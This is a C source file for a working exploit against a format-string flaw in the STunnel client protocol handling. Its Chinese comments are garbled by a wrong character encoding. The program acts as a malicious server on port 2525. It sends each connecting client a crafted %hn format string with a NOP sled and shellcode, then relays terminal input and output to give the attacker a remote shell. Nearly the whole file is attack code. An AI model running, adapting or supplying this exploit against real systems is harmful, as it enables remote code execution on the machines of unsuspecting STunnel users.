/* stunnel_exp.c
*
*  ��������͸��������ʾ����
*  ���ߣ�san, alert7, eyas, watercloud
*
*  STunnel�ͻ���Э��Э���ʽ�����©�����ó���
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <poll.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "shellcode_fcntl.c"

#define RETLOC      0x41414141
#define SHADDR      0xbffff000
#define ALIGN       0
#define FLAG        3
#define PORT        2525
/*
 * Normal data may be read.
 */
#define POLLRDNORM  0x040

void mkfmt(char *fmtstr, u_long retloc, u_long shaddr, int align, int flag)
{
    int i;
    unsigned int valh;
    unsigned int vall;
    unsigned int b0 = (retloc >> 24) & 0xff;
    unsigned int b1 = (retloc >> 16) & 0xff;
    unsigned int b2 = (retloc >>  8) & 0xff;
    unsigned int b3 = (retloc      ) & 0xff;


    /* detailing the value */
    valh = (shaddr >> 16) & 0xffff; //top
    vall = shaddr & 0xffff;         //bottom

    for (i = 0; i < align; i++) {
        *fmtstr++ = 0x41;
    }

    /* let's build */
    if (valh < vall) {
        sprintf(fmtstr,
                "%c%c%c%c"           /* high address */
                "%c%c%c%c"           /* low address */
                "%%%uc"              /* set the value for the first %hn */
                "%%%d$hn"            /* the %hn for the high part */
                "%%%uc"              /* set the value for the second %hn */
                "%%%d$hn"            /* the %hn for the low part */
                ,
                b3+2, b2, b1, b0,    /* high address */
                b3, b2, b1, b0,      /* low address */
                valh-8,              /* set the value for the first %hn */
                flag,                /* the %hn for the high part */
                vall-valh,           /* set the value for the second %hn */
                flag+1               /* the %hn for the low part */
               );
    } else {
        sprintf(fmtstr,
                "%c%c%c%c"           /* high address */
                "%c%c%c%c"           /* low address */
                "%%%uc"              /* set the value for the first %hn */
                "%%%d$hn"            /* the %hn for the high part */
                "%%%uc"              /* set the value for the second %hn */
                "%%%d$hn"            /* the %hn for the low part */
                ,                                                             
                b3+2, b2, b1, b0,    /* high address */
                b3, b2, b1, b0,      /* low address */
                vall-8,              /* set the value for the first %hn */
                flag+1,              /* the %hn for the high part */
                valh-vall,           /* set the value for the second %hn */
                flag                 /* the %hn for the low part */
               );
    }
}

int main(int argc,char *argv[])
{
    int retloc = RETLOC;
    int shaddr = SHADDR;
    int align  = ALIGN;
    int flag   = FLAG;
    int port   = PORT;

    struct sockaddr_in addr;
    int addrlen;
    int sock;
    int option = 1;
    int rc;
    int k;
    struct pollfd fds[2];
    unsigned char cmdline[256];
    unsigned char buf[8192];

    unsigned char fmtbuf[2048];
    unsigned char nop[256];
    unsigned char data[4] = "Xc0n";

    if (argc > 1) align = atoi(argv[1]);
    if (argc > 2) flag  = atoi(argv[2]);

    memset(fmtbuf, 0, sizeof(fmtbuf));
    /*
     * ������ʽ��
     */
    mkfmt(fmtbuf, retloc, shaddr, align, flag);

    GetShellcode();
    memset(nop, 0x90, sizeof(nop));
    nop[sizeof(nop)-1] = 0;

    strcat(fmtbuf, nop);
    strcat(fmtbuf, sh_Buff);
    strcat(fmtbuf, "\r\n");

    /*
     * �����׽���
     */
    addrlen = sizeof(addr);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    /*
     * �����׽��ֽ���TIME_WAIT״̬
     */
    rc = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));

    if (rc < 0)
        perror("setsockopt");

    /*
     * ��ʼ���ṹ�壬���󶨶˿�
     */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    rc = bind(sock, (struct sockaddr *) &addr, addrlen);
    if (rc < 0)
        perror("bind");

    /*
     * ���������׽ӿ�
     */
    rc = listen(sock, 5);
    if (rc < 0)
        perror("listen");

    /*
     * �ȴ�����
     */
    for (;;)
    {
        rc = accept(sock, (struct sockaddr *) &addr, &addrlen);
        if (rc < 0)
            perror("accept");

        /*
         * ���͹�������
         */
        if (write(rc, fmtbuf, strlen(fmtbuf)) < 0)
            perror("write");

        if (write(rc, data, 4) < 0)
            perror("write");

        /*
         * ��׼����
         */
        fds[0].fd     = 0;
        fds[0].events = POLLRDNORM;
        /*
         * �׽���
         */
        fds[1].fd     = rc;
        fds[1].events = POLLRDNORM;

        for ( ; ; )
        {
            /*
             * �����β�Ϊ-1����ʾ��Զ�ȴ����������Ժ���Ϊ��λ�ĳ�ʱʱ�ޡ�
             */
            k = poll( fds, 2, -1 );
            if ( k < 0 )
                perror("poll");

            if ( fds[0].revents & POLLRDNORM )
            {
                fgets( cmdline, sizeof( cmdline ), stdin );
                write( rc, cmdline, strlen(cmdline) );
            }

            /*
             * �ο�UNP Vol I 6.10С�ڣ�ĳЩʵ���ڽ���RST��ʱ����POLLERR������
             * һЩʵ���򷵻�POLLRDNORM
             */
            if ( fds[1].revents & ( POLLRDNORM | POLLERR ) )
            {
                k = read( rc, buf, sizeof( buf ) );
                if ( k < 0 )
                    perror("read");
                /*
                 * ���׼���д
                 */
                write( 1, buf, k );
            }
        }
        
    }

    close(rc);
    close(sock);
    exit(0);
}
